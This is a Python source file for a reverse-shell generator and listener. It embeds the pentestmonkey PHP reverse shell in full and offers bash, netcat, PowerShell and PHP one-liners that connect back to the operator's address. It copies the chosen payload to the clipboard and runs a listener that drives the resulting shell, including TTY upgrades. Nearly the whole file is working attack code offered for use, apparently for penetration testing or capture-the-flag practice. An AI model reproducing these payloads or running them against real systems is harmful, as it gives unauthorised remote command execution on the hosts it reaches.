import netifaces as ni
import os
import pyperclip
import glob
import socket



reversephp = '''


<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = "$$ip$$";  // CHANGE THIS
$port = $$port$$;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>


'''


with open("reverse.php","w") as file:
	file.write(reversephp)

def tty():
	global shell
	global command_pannel
	temp_shell = shell
	print("Invoking tty")
	client_socket.send(("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
	while True:
		results = client_socket.recv(buffer).decode()
		if shell in results:
			break
	if results == temp_shell:
		client_socket.send(("python -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
		while True:
			results = client_socket.recv(buffer).decode()
			if shell in results:
				break
	if results == temp_shell:
		client_socket.send(("bash -p"+"\n").encode())
		while True:
			results = client_socket.recv(buffer).decode()
			if shell in results:
				break
	if results == temp_shell:
		print("Failed")
	else:
		print("success")
		shell = results
		command_pannel = False
def start_listener(port):
	global client_socket
	global buffer
	global shell
	global command_pannel

	host = "0.0.0.0"
	port = port
	buffer = 1024
	s = socket.socket()

	s.bind((host, port))
	s.listen(5)
	print(f"Listening at {host}:{port} ...")
	client_socket, client_address = s.accept()
	print(f"{client_address[0]} on port : {client_address[1]}                    [+]Connected")

	results = "a"
	shell = client_socket.recv(buffer).decode()
	command_pannel = True

	disponible_commands = ["\n-> Exploitation:","shell  : Invoke shell","\n-> Interface:","exit  : kill the reverse shell","other  : Display specific commands", "\n-> Inside Rev Shell Commands:","#help  : Display help message"]
	other_commands = {"tty":"Invoke tty"}
	shell_commands = ["#help  : Display this message","#kill  : Exit the reverse shell and the program", "#exit  : Return to command panel"]


	while True:
		if command_pannel == False:
			liste = []
			command = input(shell)
			client_socket.send((command+"\n").encode())
			if command.lower() == "#kill":
				client_socket.send(("exit"+"\n").encode())
				break
			elif command.lower() == "#exit":
				command_pannel = True
			elif command.lower() == "#help":
				for i in shell_commands:
					print(i)
			elif command.lower() == "exit":
				break
			while True:
				results = client_socket.recv(buffer).decode()
				for i in results.split("\n"):
					if i!=command:
						liste.append(i)
				if shell in results:
					break
			while "" in liste:
				liste.remove("")
			print("\n".join(liste[:-1]))
		elif command_pannel == True:
			command = input(">>")
			if command == "help":
				for i in disponible_commands:
					print(f"{i}")
			elif command == "shell":
				command_pannel = False
			elif command == "exit":
				break
			elif command == "other":
				for i in other_commands.keys():
					print(i)
			elif command in other_commands:
				exec(command+f"()")
			elif command not in other_commands:
				os.system(command)
	client_socket.close()

	s.close()


banner = """
 @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       @@@@@@@    @@@@@@    @@@@@@   @@@@@@@   @@@@@@@
@@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@
!@@       @@!  @@@  @@!       @@!       @@!       @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@
!@!       !@!  @!@  !@!       !@!       !@!       !@   @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@
!!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       @!@!@!@   @!@  !@!  @!@!@!@!  @!@!!@!   @!@  !@!
 !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       !!!@!!!!  !@!  !!!  !!!@!!!!  !!@!@!    !@!  !!!
     !:!  !!:  !!!  !!:       !!:       !!:       !!:  !!!  !!:  !!!  !!:  !!!  !!: :!!   !!:  !!!
    !:!   :!:  !:!  :!:        :!:       :!:      :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!
:::: ::   ::   :::   :: ::::   :: ::::   :: ::::   :: ::::  ::::: ::  ::   :::  ::   :::   :::: ::
:: : :     :   : :  : :: ::   : :: : :  : :: : :  :: : ::    : :  :    :   : :   :   : :  :: :  :
                                                                                                    \n"""
def clear():
        os.system("clear")
        print(banner)

try:
	ip = ni.ifaddresses("tun0")[ni.AF_INET][0]['addr']
except:
	try:
		ip = ni.ifaddresses("eth0")[ni.AF_INET][0]['addr']
	except:
		ip = input("The Listening ip")
choice1 = 1000
port = 1234
clear()

bash = {1:f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",2:f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",3:f"sh -i >& /dev/udp/{ip}/{port} 0>&1"}
netcat = {1:f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",2:f"nc -e /bin/bash {ip} {port}"}
powershell = {1:f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ip+'",'+str(port)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'}
php = {1:f"php -r '$sock=fsockopen("+'"'+ip + '"'+","+str(port)+');exec("/bin/sh -i <&3 >&3 2>&3");'+"'",2:"File"}

liste = {1:bash,2:netcat,3:powershell,4:php}
liste_name = {1:"Bash",2:"Netcat",3:"Powershell",4:"Php"}
ext = {"Php":".php","Bash":".sh","Powershell":".ps1"}

[print(f'{i}.{liste_name[i]}') for i in liste.keys()]

while choice1 not in liste.keys():
	choice1 = int(input("\nMake Your Choice :"))
language = liste[choice1]

choice = 1000
clear()

for i in language.keys():
	print(f"{i}.{language[i]}")

while choice not in language.keys():
	choice = int(input("\nMake Your Choice :"))

payload = language[choice]
if payload=="File":
	if f'reverse{ext[liste_name[choice1]]}' in glob.glob("*.*"):
		with open(f'reverse{ext[liste_name[choice1]]}','r') as file:
			template = file.read().replace("$$ip$$",ip)
			template = template.replace("$$port$$",str(port))
			pyperclip.copy(template)
		print("Templates copied in clipboard")
	else:
		print("No such file")
else:
	print(f'Copied in clipboard : {payload}')
	pyperclip.copy(payload)


if input("Would you like to start a listener ? y/n :").upper()=="Y":
	try:
		start_listener(port)
	except KeyboardInterrupt:
		print("Cancelled by user")
else:
	print("Ended")


os.remove("reverse.php")
